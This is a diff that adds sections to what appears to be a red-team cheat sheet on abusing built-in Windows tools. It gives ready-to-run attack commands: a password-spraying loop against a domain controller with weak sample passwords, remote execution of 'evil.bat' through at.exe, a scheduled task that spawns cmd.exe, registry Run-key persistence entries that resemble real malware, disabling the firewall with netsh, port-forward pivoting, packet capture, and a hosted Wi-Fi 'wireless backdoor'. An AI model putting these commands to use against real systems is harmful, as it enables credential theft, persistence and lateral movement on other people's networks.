@@ -7,6 +7,49 @@ Living off the land is using native operating system utilities to bypass control
 
 ## net.exe
 
+### Password Spraying
+
+http://pwnwiki.io/#!privesc/windows/index.md#Password_Spraying
+
+    net user /domain > DomainUsers.txt
+    echo "Password1" >> pass.txt
+    echo "1q2w3e4r" >> pass.txt
+
+For loop:
+
+    @FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
+
+## at.exe
+
+Note: deprecated in Windows 8+
+
+### Privileged Escalation
+
+This command can be used locally to escalate privilege to SYSTEM or be used across a network to execute commands on another system.
+
+http://pwnwiki.io/#!privesc/windows/index.md
+
+Input:
+
+    at 13:20 /interactive cmd
+
+Example:
+
+    net use \\[computername|IP] /user:DOMAIN\username password
+    net time \\[computername|IP]
+    at \\[computername|IP] 13:20 c:\temp\evil.bat
+
+## schtask.exe
+
+### Launch Interactive cmd.exe
+
+Input:
+
+    SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
+
+
+## reg.exe
+
 Input:
 
     code here
@@ -14,6 +57,50 @@ Input:
 Output:
 
     code here
+
+reg add hkcu\software\microsoft\windows\currentversion\run /v netshare /f /d %temp%\notilv.exe /t REG_EXPAND_SZ
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ausMfTQVsuC /t REG_EXPAND_SZ /d "\"C:\Users\IEUser\AppData\Roaming\Oracle\bin\javaw.exe\" -jar \"C:\Users\IEUser\wBJLxnECLJF\FysHVwDWznz.ICgcjG\"" /f
+
+## Netsh.exe
+
+http://pwnwiki.io/#!pivoting/windows/windows_cmd_network.md
+
+### Firewall Control
+
+Input:
+
+    netsh firewall set opmode [disable|enable]
+
+### Netsh.exe Pivoting
+
+Input:
+
+    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
+
+Can also support v4tov6, v6tov6, and v6tov4
+
+### Netsh.exe Sniffing
+
+Input:
+
+    netsh trace start capture=yes overwrite=no tracefile=<FilePath.etl>
+
+to stop:
+
+    netsh trace stop
+
+### Netsh.exe Wireless backdoor
+
+Input:
+
+    netsh wlan set hostednetwork mode=[allow\|disallow]
+    netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
+    netsh wlan [start|stop] hostednetwork
+
+Enables or disables hostednetwork service.
+Complete hosted network setup for creating a wireless backdoor.
+Starts or stops a wireless backdoor. See below to set it up.
 
 ## Regsvr32.exe
 
